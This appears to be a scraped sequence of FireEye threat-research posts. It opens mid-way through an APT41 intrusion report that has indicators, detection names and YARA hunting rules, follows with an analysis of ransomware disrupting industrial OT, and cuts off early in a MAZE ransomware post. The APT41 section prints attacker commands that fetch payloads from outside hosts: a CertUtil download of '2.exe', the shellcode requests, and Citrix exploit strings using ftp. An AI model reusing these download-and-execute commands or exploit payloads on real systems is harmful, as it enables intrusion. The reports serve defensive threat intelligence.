 <p>
  <span class="type-XS">Figure 9: Example APT41 Cobalt Strike BEACON
    jquery malleable C2 profile HTTP request</span></p>
 <p>Within a few hours of initial exploitation, APT41 used the
  storescyncsvc.dll BEACON backdoor to download a secondary backdoor
  with a different C2 address that uses Microsoft CertUtil, a common <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/08/game-over-detecting-and-stopping-an-apt41-operation.html">TTP
    that we’ve observed APT41 use in past intrusions</a>, which they
  then used to download 2.exe (MD5: 3e856162c36b532925c8226b4ed3481c).
  The file 2.exe was a VMProtected Meterpreter downloader used to
  download Cobalt Strike BEACON shellcode. The <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/10/lowkey-hunting-for-the-missing-volume-serial-id.html">usage
    of VMProtected binaries</a> is another very common TTP that we’ve
  observed this group leverage in multiple intrusions in order to delay
  analysis of other tools in their toolkit.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>GET /2.exe HTTP/1.1<br /> Cache-Control: no-cache<br />
          Connection: Keep-Alive<br /> Pragma: no-cache<br /> Accept:
          */*<br /> User-Agent: Microsoft-CryptoAPI/6.3<br /> Host:
        91.208.184[.]78</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 10: Example HTTP request downloading
    ‘2.exe’ VMProtected Meterpreter downloader via CertUtil</span></p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>certutil  -urlcache -split -f
        http://91.208.184[.]78/2.exe</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 11: Example CertUtil command to download
    ‘2.exe’ VMProtected Meterpreter downloader</span></p>
 <p>The Meterpreter downloader ‘TzGG’ was configured to communicate with
  91.208.184[.]78 over port 443 to download the shellcode (MD5:
  659bd19b562059f3f0cc978e15624fd9) for Cobalt Strike BEACON (trial-version).</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>GET /TzGG HTTP/1.1<br /> User-Agent: Mozilla/4.0
          (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)<br />
          Host: 91.208.184[.]78:443<br /> Connection: Keep-Alive<br />
          Cache-Control: no-cache</p> </td> </tr></tbody></table>
 <p>
  <span class="type-XS">Figure 12: Example HTTP request downloading
    ‘TzGG’ shellcode for Cobalt Strike BEACON</span></p>
 <p>The downloaded BEACON shellcode connected to the same C2 server:
  91.208.184[.]78. We believe this is an example of the actor attempting
  to diversify post-exploitation access to the compromised systems.</p>
 <p>ManageEngine released a short term <a
  href="https://www.manageengine.com/products/desktop-central/remote-code-execution-vulnerability.html">mitigation</a>
  for CVE-2020-10189 on January 20, 2020, and subsequently released an
    <a
  href="https://www.manageengine.com/products/desktop-central/rce-vulnerability-cve-2020-10189.html?utm_source=rce-kb">update</a>
  on March 7, 2020, with a long term fix.</p>
 <h4>Outlook</h4>
 <p>This activity is one of the most widespread campaigns we have seen
  from China-nexus espionage actors in recent years. While APT41 has
  previously conducted activity with an extensive initial entry such as
  the trojanizing of NetSarang software, this scanning and exploitation
    <u>has focused on a subset of our customers</u>, and seems to reveal
  a high operational tempo and wide collection requirements for APT41.</p>
 <p>It is notable that we have only seen these exploitation attempts
  leverage publicly available malware such as Cobalt Strike and
  Meterpreter. While these backdoors are full featured, in previous
  incidents APT41 has waited to deploy more advanced malware until they
  have fully understood where they were and carried out some initial
  reconnaissance. In 2020, APT41 continues to be one of the most
  prolific threats that FireEye currently tracks. This new activity from
  this group shows how resourceful and how quickly they can leverage
  newly disclosed vulnerabilities to their advantage.</p>
 <p>Previously, <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">FireEye
    Mandiant Managed Defense</a> identified APT41 successfully leverage
  CVE-2019-3396 (Atlassian Confluence) against a U.S. based university.
  While APT41 is a <a
  href="https://content.fireeye.com/apt-41/rpt-apt41/">unique</a>
  state-sponsored Chinese threat group that conducts espionage, the
  actor also conducts financially motivated activity for personal gain.</p>
 <h4>Indicators</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>Type</p> </td> <td width="312"
        valign="top"><p>Indicator(s)</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>CVE-2019-19781 Exploitation
          (Citrix Application Delivery Control)</p> </td> <td
        width="312" valign="top"><p>66.42.98[.]220</p> <p>CVE-2019-19781
          exploitation attempts with a payload of ‘file /bin/pwd’</p>
          <p>CVE-2019-19781 exploitation attempts with a payload of
          ‘/usr/bin/ftp -o /tmp/un
        ftp://test:[redacted]\@66.42.98[.]220/bsd’</p> <p>CVE-2019-19781
          exploitation attempts with a payload of ‘/usr/bin/ftp -o
          /tmp/un ftp://test:[redacted]\@66.42.98[.]220/un’</p>
        <p>/tmp/bsd</p> <p>/tmp/un</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Cisco Router Exploitation</p>
      </td> <td width="312" valign="top"><p>66.42.98\.220</p> <p>‘1.txt’
          (MD5:  c0c467c8e9b2046d7053642cc9bdd57d)</p> <p>‘fuc’ (MD5:
        155e98e5ca8d662fad7dc84187340cbc</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>CVE-2020-10189 (Zoho ManageEngine
          Desktop Central)</p> </td> <td width="312"
        valign="top"><p>66.42.98[.]220</p> <p>91.208.184[.]78</p>
        <p>74.82.201[.]8</p> <p>exchange.dumb1[.]com</p> <p>install.bat
          (MD5: 7966c2c546b71e800397a67f942858d0)</p>
          <p>storesyncsvc.dll (MD5:
        5909983db4d9023e4098e56361c96a6f)</p>
        <p>C:\Windows\Temp\storesyncsvc.dll</p>
        <p>C:\Windows\Temp\install.bat</p> <p>2.exe (MD5:
        3e856162c36b532925c8226b4ed3481c)</p>
        <p>C:\Users\[redacted]\install.bat</p> <p>TzGG (MD5:
        659bd19b562059f3f0cc978e15624fd9)</p>
          <p>C:\ManageEngine\DesktopCentral_Server\jre\bin\java.exe
          spawning cmd.exe and/or bitsadmin.exe</p> <p>Certutil.exe
          downloading 2.exe and/or payloads from 91.208.184[.]78</p>
          <p>PowerShell downloading files with Net.WebClient</p> </td> </tr></tbody></table>
 <h4>Detecting the Techniques</h4>
 <p>FireEye detects this activity across our platforms. This table
  contains several specific detection names from a larger list of
  detections that were available prior to this activity occurring.</p>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>Platform</p> </td> <td width="312"
          valign="top"><p>Signature Name</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Endpoint Security</p> <p> </p>
      </td> <td width="312" valign="top"><p>BITSADMIN.EXE MULTISTAGE
          DOWNLOADER (METHODOLOGY)</p> <p>CERTUTIL.EXE DOWNLOADER A
        (UTILITY)</p> <p>Generic.mg.5909983db4d9023e</p>
        <p>Generic.mg.3e856162c36b5329</p> <p>POWERSHELL DOWNLOADER
        (METHODOLOGY)</p> <p>SUSPICIOUS BITSADMIN USAGE B
        (METHODOLOGY)</p> <p>SAMWELL (BACKDOOR)</p> <p>SUSPICIOUS CODE
          EXECUTION FROM ZOHO MANAGE ENGINE (EXPLOIT)</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Network Security</p> </td> <td
        width="312" valign="top"><p>Backdoor.Meterpreter</p>
        <p>DTI.Callback</p> <p>Exploit.CitrixNetScaler</p>
        <p>Trojan.METASTAGE</p>
        <p>Exploit.ZohoManageEngine.CVE-2020-10198.Pwner</p>
        <p>Exploit.ZohoManageEngine.CVE-2020-10198.mdmLogUploader</p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Helix</p> </td> <td width="312"
          valign="top"><p>CITRIX ADC [Suspicious Commands]<br />
           EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Attempt]<br />
           EXPLOIT - CITRIX ADC [CVE-2019-19781 Exploit Success]<br />
           EXPLOIT - CITRIX ADC [CVE-2019-19781 Payload Access]<br />
           EXPLOIT - CITRIX ADC [CVE-2019-19781 Scanning]<br />  MALWARE
          METHODOLOGY [Certutil User-Agent]<br />  WINDOWS METHODOLOGY
          [BITSadmin Transfer]<br />  WINDOWS METHODOLOGY [Certutil
        Downloader]</p> </td> </tr></tbody></table>
 <h4>MITRE ATT&amp;CK Technique Mapping</h4>
 <table border="1" cellspacing="0" cellpadding="0"> <tbody>
    <tr>
      <td width="312" valign="top"><p>ATT&amp;CK</p> </td> <td
        width="312" valign="top"><p>Techniques</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Initial Access</p> </td> <td
        width="312" valign="top"><p>External Remote Services (T1133),
          Exploit Public-Facing Application (T1190)</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Execution</p> </td> <td
        width="312" valign="top"><p>PowerShell (T1086), Scripting
        (T1064)</p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Persistence</p> </td> <td
        width="312" valign="top"><p>New Service (T1050)</p> <p> </p>
      </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Privilege Escalation</p> </td> <td
        width="312" valign="top"><p>Exploitation for Privilege
          Escalation (T1068)</p> <p> </p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Defense Evasion</p> </td> <td
        width="312" valign="top"><p>BITS Jobs (T1197), Process Injection
        (T1055)</p> <p> </p> <p> </p> </td> </tr>
    <tr>
      <td width="312" valign="top"><p>Command And Control</p> </td> <td
        width="312" valign="top"><p>Remote File Copy (T1105), Commonly
          Used Port (T1436), Uncommonly Used Port (T1065), Custom
          Command and Control Protocol (T1094), Data Encoding (T1132),
          Standard Application Layer Protocol (T1071)</p> </td> </tr></tbody></table>
 <h4>Appendix A: Discovery Rules</h4>
 <p>The following Yara rules serve as examples of discovery rules for
  APT41 actor TTPs, turning the adversary methods or tradecraft into new
  haystacks for purposes of detection or hunting. For all
  tradecraft-based discovery rules, we recommend deliberate testing and
  tuning prior to implementation in any production system. Some of these
  rules are tailored to build concise haystacks that are easy to review
  for high-fidelity detections. Some of these rules are broad in
  aperture that build larger haystacks for further automation or
  processing in threat hunting systems.</p>
 <table cellpadding="1" cellspacing="0" border="1"> <tbody>
    <tr>
      <td><p>import &quot;pe&quot;</p> <p>rule
        ExportEngine_APT41_Loader_String</p> <p>{</p> <p>           
        meta:</p> <p>                        author =
        &quot;@stvemillertime&quot;</p> <p>                       
          description &quot;This looks for a common APT41 Export DLL
          name in BEACON shellcode loaders, such as
        loader_X86_svchost.dll&quot;</p> <p>            strings:</p>
          <p>                        $pcre =
        /loader_[\x00-\x7F]{1,}\x00/</p> <p>            condition:</p>
          <p>                        uint16(0) == 0x5A4D and
          uint32(uint32(0x3C)) == 0x00004550 and $pcre at
          pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)
          + 12))</p> <p>}</p> <p>rule ExportEngine_ShortName</p>
        <p>{</p> <p>    meta:</p> <p>        author =
        &quot;@stvemillertime&quot;</p> <p>        description =
          &quot;This looks for Win PEs where Export DLL name is a single
        character&quot;</p> <p>    strings:</p> <p>        $pcre =
        /[A-Za-z0-9]{1}\.(dll|exe|dat|bin|sys)/</p> <p>   
        condition:</p> <p>        uint16(0) == 0x5A4D and
          uint32(uint32(0x3C)) == 0x00004550 and $pcre at
          pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)
          + 12))</p> <p>}</p> <p>rule ExportEngine_xArch</p> <p>{</p>
          <p>    meta:</p> <p>        author =
        &quot;@stvemillertime&quot;</p> <p>        description =
          &quot;This looks for Win PEs where Export DLL name is a
          something like x32.dat&quot;</p> <p>            strings:</p>
          <p>             $pcre =
        /[\x00-\x7F]{1,}x(32|64|86)\.dat\x00/</p> <p>           
        condition:</p> <p>             uint16(0) == 0x5A4D and
          uint32(uint32(0x3C)) == 0x00004550 and $pcre at
          pe.rva_to_offset(uint32(pe.rva_to_offset(pe.data_directories[pe.IMAGE_DIRECTORY_ENTRY_EXPORT].virtual_address)
          + 12))</p> <p>}</p> <p>rule RareEquities_LibTomCrypt</p>
        <p>{</p> <p>    meta:</p> <p>        author =
        &quot;@stvemillertime&quot;</p> <p>        description =
          &quot;This looks for executables with strings from LibTomCrypt
          as seen by some APT41-esque actors
          https://github.com/libtom/libtomcrypt - might catch everything
          BEACON as well. You may want to exclude Golang and UPX packed
        samples.&quot;</p> <p>    strings:</p> <p>        $a1 =
        &quot;LibTomMath&quot;</p> <p>    condition:</p> <p>       
          uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550 and
        $a1</p> <p>}</p> <p>rule RareEquities_KCP</p> <p>{</p> <p>   
        meta:</p> <p>        author = &quot;@stvemillertime&quot;</p>
          <p>        description = &quot;This is a wide catchall rule
          looking for executables with equities for a transport library
          called KCP, https://github.com/skywind3000/kcp Matches on this
          rule may have built-in KCP transport ability.&quot;</p> <p>   
        strings:</p> <p>        $a01 = &quot;[RO] %ld bytes&quot;</p>
          <p>        $a02 = &quot;recv sn=%lu&quot;</p> <p>        $a03
          = &quot;[RI] %d bytes&quot;</p> <p>        $a04 = &quot;input
          ack: sn=%lu rtt=%ld rto=%ld&quot;</p> <p>        $a05 =
          &quot;input psh: sn=%lu ts=%lu&quot;</p> <p>        $a06 =
          &quot;input probe&quot;</p> <p>        $a07 = &quot;input
          wins: %lu&quot;</p> <p>        $a08 =
        &quot;rcv_nxt=%lu\\n&quot;</p> <p>        $a09 =
          &quot;snd(buf=%d, queue=%d)\\n&quot;</p> <p>        $a10 =
          &quot;rcv(buf=%d, queue=%d)\\n&quot;</p> <p>        $a11 =
        &quot;rcvbuf&quot;</p> <p>    condition:</p> <p>       
          (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550)
          and filesize &lt; 5MB and 3 of ($a*)</p> <p>}</p> <p>rule
        ConventionEngine_Term_Users</p> <p>{</p> <p>           
        meta:</p> <p>                        author =
        &quot;@stvemillertime&quot;</p> <p>                       
          description = &quot;Searching for PE files with PDB path
          keywords, terms or anomalies.&quot;</p>
          <p>                        sample_md5 =
        &quot;09e4e6fa85b802c46bc121fcaecc5666&quot;</p>
          <p>                        ref_blog =
        &quot;https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html&quot;</p>
          <p>            strings:</p> <p>                        $pcre =
          /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Users[\x00-\xFF]{0,200}\.pdb\x00/
          nocase ascii</p> <p>            condition:</p>
          <p>                        (uint16(0) == 0x5A4D) and
          uint32(uint32(0x3C)) == 0x00004550 and $pcre</p> <p>}</p>
          <p>rule ConventionEngine_Term_Desktop</p> <p>{</p>
          <p>            meta:</p> <p>                        author =
        &quot;@stvemillertime&quot;</p> <p>                       
          description = &quot;Searching for PE files with PDB path
          keywords, terms or anomalies.&quot;</p>
          <p>                        sample_md5 =
        &quot;71cdba3859ca8bd03c1e996a790c04f9&quot;</p>
          <p>                        ref_blog =
        &quot;https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html&quot;</p>
          <p>            strings:</p> <p>                        $pcre =
          /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}Desktop[\x00-\xFF]{0,200}\.pdb\x00/
          nocase ascii</p> <p>            condition:</p>
          <p>                        (uint16(0) == 0x5A4D) and
          uint32(uint32(0x3C)) == 0x00004550 and $pcre</p> <p>}</p>
          <p>rule ConventionEngine_Anomaly_MultiPDB_Double</p> <p>{</p>
          <p>            meta:</p> <p>                        author =
        &quot;@stvemillertime&quot;</p> <p>                       
          description = &quot;Searching for PE files with PDB path
          keywords, terms or anomalies.&quot;</p>
          <p>                        sample_md5 =
        &quot;013f3bde3f1022b6cf3f2e541d19353c&quot;</p>
          <p>                        ref_blog =
        &quot;https://www.fireeye.com/blog/threat-research/2019/08/definitive-dossier-of-devilish-debug-details-part-one-pdb-paths-malware.html&quot;</p>
          <p>            strings:</p> <p>                        $pcre =
        /RSDS[\x00-\xFF]{20}[a-zA-Z]:\\[\x00-\xFF]{0,200}\.pdb\x00/</p>
          <p>            condition:</p> <p>                       
          (uint16(0) == 0x5A4D) and uint32(uint32(0x3C)) == 0x00004550
          and #pcre == 2</p> <p>}</p> </td> </tr></tbody></table>
http://www.fireeye.com/blog/threat-research/2020/03/apt41-initiates-global-intrusion-campaign-using-multiple-exploits.html2020-03-25T12:00:00.000Z2020-07-24T07:20:13.613ZRansomware Against the Machine: How Adversaries are Learning to Disrupt
Industrial Production by Targeting IT and OTnoemail@noemail.orgDaniel Kapellmann Zafra<p>Since at least 2017, there has been a significant increase in public
  disclosures of ransomware incidents impacting industrial production
  and critical infrastructure organizations. Well-known ransomware
  families like WannaCry, LockerGoga, MegaCortex, Ryuk, Maze, and now
  SNAKEHOSE (a.k.a. Snake / Ekans), have cost victims across a variety
  of industry verticals many millions of dollars in ransom and
  collateral costs. These incidents have also resulted in significant
  disruptions and delays to the physical processes that enable
  organizations to produce and deliver goods and services.</p>
 <p>While lots of information has been shared about the victims and
  immediate impacts of industrial sector ransomware distribution
  operations, the public discourse continues to miss the big picture. As
  financial crime actors have evolved their tactics from opportunistic
  to post-compromise ransomware deployment, we have observed an increase
  in adversaries’ internal reconnaissance that enables them to target
  systems that are vital to support the chain of production. As a
  result, ransomware infections—either affecting critical assets in
  corporate networks or reaching computers in OT networks—often result
  in the same outcome: insufficient or late supply of end products or services.</p>
 <p>Truly understanding the unique nuances of industrial sector
  ransomware distribution operations requires a combination of skillsets
  and visibility across both IT and OT systems. Using examples derived
  from our consulting engagements and threat research, we will explain
  how the shift to post-compromise ransomware operations is fueling
  adversaries’ ability to disrupt industrial operations.</p>
 <h4>Industrial Sector Ransomware Distribution Poses Increasing Risk as
  Actors Move to Post-Compromise Deployment</h4>
 <p>The traditional approach to ransomware attacks predominantly relies
  on a “shotgun” methodology that consists of indiscriminate campaigns
  spreading malware to encrypt files and data from a variety of victims.
  Actors following this model will extort victims for an average of $500
  to $1,000 USD and hope to receive payments from as many individuals as
  possible. While early ransomware campaigns adopting this approach were
  often considered out of scope for OT security, recent campaigns
  targeting entire industrial and critical infrastructure organizations
  have moved toward adopting a more operationally complex
  post-compromise approach.</p>
 <p>In post-compromise ransomware incidents, a threat actor may still
  often rely on broadly distributed malware to obtain their initial
  access to a victim environment, but once on a network they will focus
  on gaining privileged access so they can explore the target networks
  and identify critical systems before deploying the ransomware. This
  approach also makes it possible for the attacker to disable security
  processes that would normally be enough to detect known ransomware
  indicators or behaviors. Actors cast wider nets that may impact
  critical systems, which  expand the scale and effectiveness of their
  end-stage operations by inflicting maximum pain on the victim. As a
  result, they are better positioned to negotiate and can often demand
  much higher ransoms—which are commonly commensurate with the victims’
  perceived ability to pay and the value of the ransomed assets
  themselves. For more information, including technical detail, on
  similar activity, see our recent blog posts on <a
  href="/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html">FIN6</a>
  and <a href="/content/fireeye-www/en_US/blog/threat-research/2019/01/a-nasty-trick-from-credential-theft-malware-to-business-disruption.html">TEMP.MixMaster</a>.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture1.png" alt="" />
  <br /> <span class="type-XS">Figure 1: Comparison of indiscriminate
    vs. post-compromise ransomware approaches</span></p>
 <p>Historical incidents involving the opportunistic deployment of
  ransomware have often been limited to impacting individual computers,
  which occasionally included OT intermediary systems that were either
  internet-accessible, poorly segmented, or exposed to infected portable
  media. In 2017, we also observed campaigns such as NotPetya and
  BadRabbit, where wiper malware with worm-like capabilities were
  released to disrupt organizations while masquerading as ransomware.
  While these types of campaigns pose a threat to industrial production,
  the adoption of post-compromise deployment presents three major twists
  in the plot.</p>
 <ul> <li>As threat actors tailor their attacks to target specific
    industries or organizations, companies with high-availability
    requirements (e.g., public utilities, hospitals, and industrial
    manufacturing) and perceived abilities to pay ransoms (e.g., higher
    revenue companies) become prime targets. This represents an
    expansion of financial crime actors’ targeting of industries that
    process directly marketable information (e.g., credit card numbers
    or customer data) to include the monetization of production
  environments.</li> <li>As threat actors perform internal
    reconnaissance and move laterally across target networks before
    deploying ransomware, they are now better positioned to cast wide
    nets that impact the target’s most critical assets and negotiate
    from a privileged position.</li> <li>Most importantly, many of the
    tactics, techniques, and procedures (TTPs) often used by financial
    actors in the past, <a
      href="/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html">resemble
      those employed by high-skilled actors</a> across the initial and
    middle stages of the attack lifecycle of past OT security incidents.
    Therefore, financial crime actors are likely capable of pivoting to
    and deploying ransomware in OT intermediary systems to further
    disrupt operations.</li> </ul>
 <h4>Organized Financial Crime Actors Have Demonstrated an Ability to
  Disrupt OT Assets</h4>
 <p>An actor’s capability to obtain financial benefits from
  post-compromise ransomware deployment depends on many factors, one of
  which is the ability to disrupt systems that are the most relevant to
  the core mission of the victim organizations. As a result, we can
  expect mature actors to gradually broaden their selection from only IT
  and business processes, to also OT assets monitoring and controlling
  physical processes. This is apparent in ransomware families such as
  SNAKEHOSE, which was designed to execute its payload only after
  stopping a series of processes that included some industrial software
  from vendors such as General Electric and Honeywell. At first glance,
  the SNAKEHOSE kill list appeared to be specifically tailored to OT
  environments due to the relatively small number of processes (yet high
  number of OT-related processes) identified with automated tools for
  initial triage. However, after manually extracting the list from the
  function that was terminating the processes, we determined that the
  kill list utilized by SNAKEHOSE actually targets over 1,000 processes.</p>
 <p>In fact, we have observed very similar process kill lists deployed
  alongside samples from other ransomware families, including
  LockerGoga, MegaCortex, and Maze. Not surprisingly, all of these code
  families have been associated with high-profile incidents impacting
  industrial organizations for the past two years. The earliest kill
  list containing OT processes we identified was a batch script deployed
  alongside LockerGoga in January 2019. The list is very similar to
  those used later in MegaCortex incidents, albeit with notable
  exceptions, such as an apparent typo on an OT-related process that is
  not present in our SNAKEHOSE or MegaCortex samples:
  “proficyclient.exe4”. The absence of this typo in the SNAKEHOSE and
  MegaCortex samples could indicate that one of these malware authors
  identified and corrected the error when initially copying the
  OT-processes from the LockerGoga list, or that the LockerGoga author
  failed to properly incorporate the processes from some theoretical
  common source of origin, such as a dark web post.</p>
 <p>
  <img
    src="https://www.fireeye.com/content/dam/fireeye-www/blog/images/icsransomware/Picture2.png" alt="" />
  <br /> <span class="type-XS">Figure 2: ‘proficyclient.exe’ spelling in
    kill lists deployed with LockerGoga (left) and SNAKEHOSE (right)</span></p>
 <p>Regardless of which ransomware family first employed the OT-related
  processes in a kill list or where the malware authors acquired the
  list, the seeming ubiquity of this list across malware families
  suggests that the list itself is more noteworthy than any
  individual malware family that has implemented it. While the OT
  processes identified in these lists may simply represent the
  coincidental output of automated process collection from target
  environments and not a targeted effort to impact OT, the existence of
  this list provides financial crime actors opportunities to disrupt OT
  systems. Furthermore, we expect that as financially motivated threat
  actors continue to impact industrial sector organizations, become more
  familiar with OT, and identify dependencies across IT and OT systems,
  they will develop capabilities—and potentially intent—to disrupt other
  systems and environments running industrial software products and technology.</p>
 <h4>Ransomware Deployments in Both IT and OT Systems Have Impacted
  Industrial Production</h4>
 <p>As a result of adversaries’ post-compromise strategy and increased
  awareness of industrial sector targets, ransomware incidents have
  effectively impacted industrial production regardless of whether the
  malware was deployed in IT or OT. Ransomware incidents encrypting data
  from servers and computers in corporate networks have resulted in
  direct or indirect disruptions to physical production processes
  overseen by OT networks. This has caused insufficient or late supply
  of end products or services, representing long-term financial losses
  in the form of missed business opportunities, costs for incident
  response, regulatory fines, reputational damage, and sometimes even
  paid ransoms. In certain sectors, such as utilities and public
  services, high availability is also critical to societal well-being.</p>
 <p>The best-known example of ransomware impacting industrial production
  due to an IT network infection is Norsk Hydro’s incident from March
  2019, where disruptions to Business Process Management Systems (BPMS)
  forced multiple sites to shut down automation operations. Among other
  collateral damage, the ransomware interrupted communication between IT
  systems that are commonly used to manage resources across the
  production chain. Interruptions to these flows of information
  containing for example product inventories, forced employees to
  identify manual alternatives to handle more than 6,500 stock-keeping
  units and 4,000 shelves. FireEye Mandiant has responded to at least
  one similar case where TrickBot was used to deploy Ryuk ransomware at
  an oil rig manufacturer. While the infection happened only on
  corporate networks, the biggest business impact was caused by
  disruptions of Oracle ERP software driving the company temporarily
  offline and negatively affecting production.</p>
 <p>Ransomware may result in similar outcomes when it reaches IT-based
  assets in OT networks, for example human-machine interfaces (HMIs),
  supervisory control and data acquisition (SCADA) software, and
  engineering workstations. Most of this equipment relies on commodity
  software and standard operating systems that are vulnerable to a
  variety of IT threats. Mandiant Intelligence is aware of at least one
  incident in which an industrial facility suffered a plant shutdown due
  to a large-scale ransomware attack, based on sensitive sources. The
  facility's network was improperly segmented, which allowed the malware
  to propagate from the corporate network into the OT network, where it
  encrypted servers, HMIs, workstations, and backups. The facility had
  to reach out to multiple vendors to retrieve backups, many of which
  were decades old, which delayed complete restoration of production.</p>
 <p>As recently as February 2020, the Cybersecurity Infrastructure and
  Security Agency (CISA) released Alert <a
  href="https://www.us-cert.gov/ncas/alerts/aa20-049a">AA20-049A</a>
  describing how a post-compromise ransomware incident had affected
  control and communication assets on the OT network of a natural gas
  compression facility. Impacts to HMIs, data historians, and polling
  servers resulted in loss of availability and loss of view for human
  operators. This prompted an intentional shut down of operations that
  lasted two days.</p>
 <h4>Mitigating the Effects of Ransomware Requires Defenses Across IT
  and OT</h4>
 <p>Threat actors deploying ransomware have made rapid advances both in
  terms of effectiveness and as a criminal business model, imposing high
  operational costs on victims. We encourage all organizations to
  evaluate their safety and industrial risks related to ransomware
  attacks. Note that these recommendations will also help to build
  resilience in the face of other threats to business operations (e.g.,
  cryptomining malware infections). While every case will differ, we
  highlight the following recommendations.</p>
 <p>For custom services and actionable intelligence in both IT and OT,
  contact FireEye <a
    href="/content/fireeye-www/en_US/mandiant/incident-response.html">Mandiant
  Consulting</a>, <a
    href="/content/fireeye-www/en_US/mandiant/managed-detection-and-response.html">Managed
  Defense</a>, and <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Threat Intelligence</a>.</p>
 <ul> <li>Conduct tabletop and/or controlled red team exercises to
    assess the current security posture and ability of your organization
    to respond to the ransomware threat. Simulate attack scenarios
    (mainly in non-production environments) to understand how the
    incident response team can (or cannot) detect, analyze, and recover
    from such an attack. Revisit recovery requirements based on the
    exercise results. In general, repeatedly practicing various threat
    scenarios will improve awareness and ability to respond to real
  incidents.</li> <li>Review operations, business processes, and
    workflows to identify assets that are critical to maintaining
    continuous industrial operations. Whenever possible, introduce
    redundancy for critical assets with low tolerance to downtime. The
    right amount and type of redundancy is unique for each organization
    and can be determined through risk assessments and cost-benefit
    analyses. Note that such analyses cannot be conducted without
    involving business process owners and collaborating across IT and
  OT.</li> <li>Logically segregate primary and redundant assets either
    by a network-based or host-based firewall with subsequent asset
    hardening (e.g., disabling services typically used by ransomware for
    its propagation, like SMB, RDP, and WMI). In addition to creating
    policies to disable unnecessary peer-to-peer and remote connections,
    we recommend routine auditing of all systems that potentially host
    these services and protocols. Note that such architecture is
    generally more resilient to security incidents.</li> <li>When
    establishing a rigorous back-up program, special attention should be
    paid to ensuring the security (integrity) of backups. Critical
    backups must be kept offline or, at minimum, on a segregated
  network.</li> <li>Optimize recovery plans in terms of recovery time
    objective. Introduce required alternative workflows (including
    manual) for the duration of recovery. This is especially critical
    for organizations with limited or no redundancy of critical assets.
    When recovering from backups, harden recovered assets and the entire
    organization's infrastructure to prevent recurring ransomware
    infection and propagation.</li> <li>Establish clear ownership and
    management of OT perimeter protection devices to ensure emergency,
    enterprise-wide changes are possible. Effective network segmentation
    must be maintained during containment and active intrusions.</li>
    <li>Hunt for adversary intrusion activity in <a
      href="/content/fireeye-www/en_US/blog/threat-research/2019/12/fireeye-approach-to-operational-technology-security.html">intermediary
    systems</a>, which we define as the networked workstations and
    servers using standard operating systems and protocols. While the
    systems are further away from direct control of physical processes,
    there is a much higher likelihood of attacker presence.</li>
    <li>Note, that every organization is different, with unique internal
    architectures and processes, stakeholder needs, and customer
    expectations. Therefore, all recommendations should be carefully
    considered in the context of the individual infrastructures. For
    instance, proper network segmentation is highly advisable for
    mitigating the spread of ransomware. However, organizations with
    limited budgets may instead decide to leverage redundant asset
    diversification, host-based firewalls, and hardening as an
    alternative to segregating with hardware firewalls.</li> </ul>
http://www.fireeye.com/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html2020-02-24T23:30:00.000Z2020-07-24T07:20:13.612ZNavigating the MAZE: Tactics, Techniques and Procedures Associated With
MAZE Ransomware Incidentsnoemail@noemail.orgJeremy Kennelly<p>Targeted ransomware incidents have brought a threat of disruptive and
  destructive attacks to organizations across industries and
  geographies. FireEye <a
    href="/content/fireeye-www/en_US/mandiant/threat-intelligence.html">Mandiant
    Threat Intelligence</a> has previously documented this threat in our
  investigations of <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/03/they-come-in-the-night-ransomware-deployment-trends.html">trends
    across ransomware incidents</a>, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html">FIN6
  activity</a>, <a
    href="/content/fireeye-www/en_US/blog/threat-research/2020/02/ransomware-against-machine-learning-to-disrupt-industrial-production.html">implications
    for OT networks</a>, and other aspects of post-compromise ransomware
  deployment. Since November 2019, we’ve seen the MAZE ransomware being
  used in attacks that combine targeted ransomware use, public exposure
  of victim data, and an affiliate model.</p>
 <p>Malicious actors have been actively deploying MAZE ransomware since
  at least May 2019. The ransomware was initially distributed via spam
  emails and exploit kits before later shifting to being deployed
